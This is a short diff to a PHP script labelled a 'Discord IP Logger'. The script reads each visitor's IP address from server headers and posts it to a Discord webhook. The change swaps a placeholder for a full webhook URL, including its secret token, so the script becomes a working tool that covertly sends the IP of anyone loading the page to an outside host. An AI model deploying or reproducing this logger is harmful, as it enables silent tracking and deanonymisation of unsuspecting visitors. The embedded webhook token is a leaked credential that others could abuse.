@@ -10,7 +10,7 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
     $ip = $_SERVER['REMOTE_ADDR'];
 }
 
-$url = "YOUR WEBHOOK URL"; // Change this to your discord webhook url
+$url = "https://discord.com/api/webhooks/941874873519706182/T3QPNnUVsKVbPTARfRpTijlNhAza7h3xiVRVmpSaX35fHRCXsh335RH5tD6uarUj_2QQ"; // Change this to your discord webhook url
 $headers = [ 'Content-Type: application/json; charset=utf-8' ];
 $POST = [ 'username' => 'Discord IP Logger by https://github.com/theravenstone', 'content' => $ip ];
 
